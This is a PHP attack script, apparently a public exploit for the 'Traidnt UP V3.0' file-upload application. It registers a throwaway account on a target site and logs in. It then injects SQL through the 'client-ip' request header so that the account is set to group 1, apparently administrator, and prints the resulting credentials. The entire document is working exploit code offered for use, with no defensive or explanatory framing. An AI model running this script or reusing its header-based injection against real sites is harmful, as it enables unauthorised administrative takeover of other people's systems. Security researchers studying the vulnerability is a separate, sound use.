set_time_limit(0);
error_reporting(0);

echo "
                 _____   _    _   _____   _____  _______
                /  ___| | |  | | /  _  \ /  ___/|__   __|
                | |  _  | |__| | | | | | | |___    | |
                | | | | |  __  | | | | | \___  \   | |
                | |_| | | |  | | | |_| |  ___| |   | |
                \_____/ |_|  |_| \_____/ /_____/   |_|
             ____    _       _____   _____   _____  ___    ___
            |  _ \  | |     /  _  \ /  _  \ |  _  \ \  \  /  /
            | |_) | | |     | | | | | | | | | | |  \ \  \/  /
            |  _ (  | |     | | | | | | | | | | |  |  \    /
            | |_) | | |___  | |_| | | |_| | | |_|  /   |  |
            |____/  |_____| \_____/ \_____/ |_____/    |__|

[*]-----------------------------------------------------------------------[*]
[+] Exploit Title  : Traidnt UP V3.0 Exploit
[+] Exploit Author : G-B
[+] Email          : g22b@hotmail.com
[*]-----------------------------------------------------------------------[*]

";
$a = true;
while($a){
    echo "[*] Target -> ";
    $target = stdin();
    if(!file_get_contents($target)){
        echo "[+] Invalid Target. Try Again.\n\n";
    }else{
        $a = false;
    }
}

$a = true;
while($a){
    echo "[+] Start Create Account.\n\n";
    $username = &#039;G22B&#039;.rand(11,99);
    $password = rand(1111111,9999999);
    
    $register = src("$target/register.php",array(&#039;name&#039;=>$username,&#039;email&#039;=>&#039;tester&#039;.rand(11,99).&#039;@hotmail.com&#039;,&#039;password&#039;=>$password));
    if(eregi(&#039;<div style="text-align:center;">&#039;,$register)){
        $a = false;
    }else{
        echo "[+] Account Creation Error. Try Again ? (Y or N) -> ";
        $yon = stdin();
        echo "\n";
        if(&#039;n&#039; == strtolower($yon)){
            exit();
        }
    }
}
echo "[+] Login Using Our New Account.\n\n";
src("$target/login.php?do=login",array(&#039;username&#039;=>$username,&#039;password&#039;=>$password));

echo "[+] Start Injection.\n\n";
src("$target/login.php?do=login",&#039;&#039;,"127.0.0.1&#039;, `group` = &#039;1&#039; WHERE `name` = &#039;$username&#039; # +");

echo "+------------------------------------------+

[+] Target   : $target
[+] Username : $username
[+] Password : $password

+------------------------------------------+";

unlink(getcwd().&#039;/cookies.txt&#039;);

function src($url,$post=&#039;&#039;,$sql=&#039;&#039;){
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    if($post){
        curl_setopt($ch,CURLOPT_POST,true);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
    }
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_COOKIEFILE,getcwd().&#039;/cookies.txt&#039;);
    curl_setopt($ch,CURLOPT_COOKIEJAR,getcwd().&#039;/cookies.txt&#039;);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
    if($sql){
        curl_setopt($ch,CURLOPT_HTTPHEADER,array("client-ip: $sql"));
    }
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
    
}
function stdin(){
    $fp = fopen("php://stdin","r");
    $line = trim(fgets($fp));
    fclose($fp);
    return $line;
}
?>

